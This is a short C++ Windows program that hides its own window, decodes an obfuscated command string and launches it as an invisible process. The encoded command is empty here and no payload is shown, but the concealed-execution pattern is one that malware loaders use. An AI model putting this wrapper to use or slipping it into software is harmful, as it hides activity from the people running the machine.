#include <iostream>
#include <string>
#include <stdexcept>

#include <windows.h>

#include "xstr.hpp"

using namespace std;

int WinMain (   HINSTANCE hInstance,
            HINSTANCE hPrevInstance,
            LPTSTR    lpCmdLine,
            int       nCmdShow 
) {
try {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

HWND hwnd = 0;
DWORD proc = GetCurrentProcessId();
do {
     hwnd = FindWindowEx( NULL, hwnd, NULL, NULL );
     DWORD pid = 0;
     GetWindowThreadProcessId ( hwnd, &pid );
     if ( pid == proc ) {
         ShowWindow( hwnd, SW_HIDE );
         break;
     }
} while ( hwnd != NULL );

    hide::line args("");
    args.decode();

    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    ZeroMemory( &pi, sizeof(pi) );

    if( !CreateProcess ( NULL,   // No module name (use command line)
        (LPSTR)args.c_str(),  // Command line
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        CREATE_NO_WINDOW,  
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &si,            // Pointer to STARTUPINFO structure
        &pi)           // Pointer to PROCESS_INFORMATION structure
    )
     throw new runtime_error("create process fail");

 //   WaitForSingleObject( pi.hProcess, INFINITE );

    CloseHandle( pi.hProcess );
    CloseHandle( pi.hThread );

    return 0;
} catch (const exception& e) {
//   cerr << e.what() << endl;
    return -1;
}}